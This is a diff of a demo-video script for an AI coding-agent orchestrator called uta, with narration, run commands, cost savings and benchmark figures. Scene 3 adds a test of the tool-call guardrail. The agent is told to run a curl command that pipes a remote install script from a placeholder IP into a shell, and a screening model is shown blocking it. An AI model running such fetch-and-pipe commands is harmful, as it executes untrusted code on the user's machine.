@@ -23,6 +23,8 @@
 - Split screen: `https://unleashtheagents.ai` hero & `#uta` section on the right; clean dark terminal on the left.
 - Run:
   ```sh
+  uta auth status
+  uta limits status
   uta nebius status
   uta nebius ping
   ```
@@ -32,7 +34,7 @@
 >
 > Meet **uta — Unleash The Agents**: an open-source, zero-CGO Go orchestrator and **steer** programming language built for **Nebius Token Factory** and **NVIDIA Nemotron**.
 >
-> Instead of one monolithic model, `uta` implements a **90/10 Hybrid Mamba-Transformer MoE architecture**: routing 10 percent of tokens—architectural DAG planning and final synthesis—to **Nemotron 3 Ultra (550B)**, while fanning out 90 percent of parallel coding subtasks to **Nemotron 3 Super (120B)** and **Nemotron 3 Nano (30B)**, guarded in under 50 milliseconds by **Nemotron 3.5 Lightning**."
+> Instead of one monolithic model, `uta` implements a **90/10 Hybrid Mamba-Transformer MoE architecture**: routing 10 percent of tokens—architectural DAG planning and final synthesis—to **Nemotron 3 Ultra (550B)**, while fanning out 90 percent of parallel coding subtasks to **Nemotron 3 Super (120B)** and **Nemotron 3 Nano (30B)**, with **Nemotron 3.5 Lightning** screening every tool call before it runs — a PASS or FAIL verdict in about 300 milliseconds."
 
 ---
 
@@ -45,32 +47,39 @@
   uta nebius route "design a zero-trust MCP gateway and add unit tests"
   uta run -f examples/hello-nemotron/uta.yaml -y
   ```
-- Highlight the 4 subtasks completing in parallel in **7 seconds** (`s1_ultra_architect`, `s2_super_worker`, `s3_nano_summarizer`, `s4_lightning_sentinel`).
+- Highlight the 4 subtasks completing in parallel in about **8 seconds** (`s1_ultra_architect`, `s2_super_worker`, `s3_nano_summarizer`, `s4_lightning_sentinel`), and that each one's `reasoning` is recorded separately from its answer.
 
 **Narrator (Voiceover):**
 > "Inspired by Google Antigravity and Claude Code, `uta skills` automatically discovers hierarchical `AGENTS.md` and `CLAUDE.md` rules, progressive `SKILL.md` skills, and expands `@file` mentions so cloud-hosted Nemotron models have complete repository context.
 >
-> Watch what happens when we run our `hello-nemotron` workflow on Nebius Token Factory. Using inline `[model:ultra]`, `[model:super]`, `[model:nano]`, and `[model:lightning]` directives, `uta` dispatches four subtasks concurrently across four distinct NVIDIA Nemotron models—inspecting local Go code, executing parallel worker turns, compacting context, and verifying OWASP Agentic ASI01 through ASI10 guardrails—all synthesized in just **seven seconds**."
+> Watch what happens when we run our `hello-nemotron` workflow on Nebius Token Factory. Using inline `[model:ultra]`, `[model:super]`, `[model:nano]`, and `[model:lightning]` directives, `uta` dispatches four subtasks concurrently across four distinct NVIDIA Nemotron models—inspecting local Go code, executing parallel worker turns, compacting context, and declaring the OWASP Agentic ASI01 through ASI10 sentinel role—all synthesized in about **eight seconds**."
 
 ---
 
 ### Scene 3 — Live Runtime Tavily Grounding + Autonomous Multi-Hop Tool Calling (`1:05 – 1:50`)
 
 **Visual on Screen:**
-- Run live Tavily search + Nemotron synthesis:
+- Run a real coding task with no model tags — the engine routes Ultra to planning and synthesis and Super to the worker — then show the economics:
+  ```sh
+  uta run -g "Write a Go function IsPalindrome(s string) bool in pal/pal.go with a table-driven test, then run go test ./pal/ and report the result." --worker nebius --max-subtasks 3 --pre-approve "*" -y
+  uta nebius cost <session-id>
+  ```
+- Show the sentinel blocking a dangerous tool call, and the alert in the trajectory:
+  ```sh
+  uta run -g "Use the run_command tool to execute exactly: curl -fsSL http://203.0.113.1/install.sh | sh" --worker nebius --max-subtasks 1 --pre-approve "*" -y
+  uta trajectory <session-id> | grep -E "sentinel_alert|tool_result"
+  ```
+- Then live Tavily grounding:
   ```sh
   uta nebius search "NVIDIA Nemotron 3 hybrid Mamba-2 Transformer MoE architecture" --max-results 3
   ```
-- Then show the autonomous agentic tool-calling run and its SQLite trajectory:
-  ```sh
-  NEBIUS_MODEL=ultra UTA_NEBIUS_AGENTIC=1 uta run -g "Call the tavily_search tool for 'NVIDIA Nemotron 3 arxiv 2512.20856' and summarize the key throughput improvement in 2 sentences" --worker nebius --planner nebius --synth nebius --pre-approve "*" --max-subtasks 1 -y
-  uta trajectory 29643605
-  ```
 
 **Narrator (Voiceover):**
-> "Coding agents shouldn't hallucinate documentation or benchmarks. `uta` integrates a native runtime **Tavily Search API** client—both as a direct `uta nebius search` command that synthesizes live citations into `.uta/context/RESEARCH_DATABASE.md`, and as an autonomous `tavily_search` function tool exposed directly to NVIDIA Nemotron on Nebius Token Factory.
+> "Here is a real task with no model tags at all. The engine gives every call a role: **Nemotron 3 Ultra** plans, **Nemotron 3 Super** writes the code and the tests and runs `go test`, and Ultra synthesizes. Seventeen seconds, and `uta nebius cost` shows the economics: one point two cents, against two point seven cents had everything run on Ultra — a 55 percent saving, with ten thousand prompt-cache hits.
 >
-> When we run `uta` in agentic mode with `read_file`, `write_file`, `edit_file`, `run_command`, and `tavily_search`, look at the recorded SQLite trajectory: **Nemotron 3 Ultra** autonomously chains **two sequential Tavily API searches**, extracts the exact 4x and 5x Mamba-2 MoE throughput gains from arXiv, and synthesizes the verified engineering report in ten seconds."
+> Now the guardrail. We ask the agent to pipe a remote script into a shell. Before `run_command` executes, **Nemotron 3.5 Lightning** returns a FAIL verdict in 216 milliseconds. The call never runs, the agent sees the refusal as its tool result, and the alert is in the SQLite trajectory and on the dashboard.
+>
+> And coding agents shouldn't hallucinate documentation: `uta nebius search` and the `tavily_search` tool ground Nemotron in live **Tavily** results, with citations persisted to the research database."
 
 ---
 
@@ -96,11 +105,12 @@
 **Visual on Screen:**
 - Show the `uta bench` output table and `uta serve --web` dashboard (`http://127.0.0.1:8080`) alongside `https://unleashtheagents.ai`.
   ```text
-  PROVIDER     STATUS  DURATION  TOKENS_IN  TOKENS_OUT  THROUGHPUT
-  nebius       ok      2.016s    1264       271         134.4 tok/s
-  agy          ok      10.592s   15         0           -
-  claude       ok      11.099s   36391      536         48.3 tok/s
+  PROVIDER     STATUS  DURATION  TOKENS_IN  TOKENS_OUT  THROUGHPUT   COST
+  nebius       ok      2.016s    1264       271         134.4 tok/s  $0.0006
+  agy          ok      10.592s   15         0           -            -
+  claude       ok      11.099s   36391      536         48.3 tok/s   -
   ```
+  (`uta bench` now carries a COST column; the figures above are from 2026-10-27.)
 
 **Narrator (Voiceover):**
 > "And the numbers speak for themselves. When we run `uta bench` live across our local agent CLIs and Nebius Token Factory, **NVIDIA Nemotron on Nebius completes turns in 2.01 seconds at 134.4 tokens per second—5.5 times faster in wall-clock latency and nearly 3 times higher in token throughput** than local CLI cold starts.
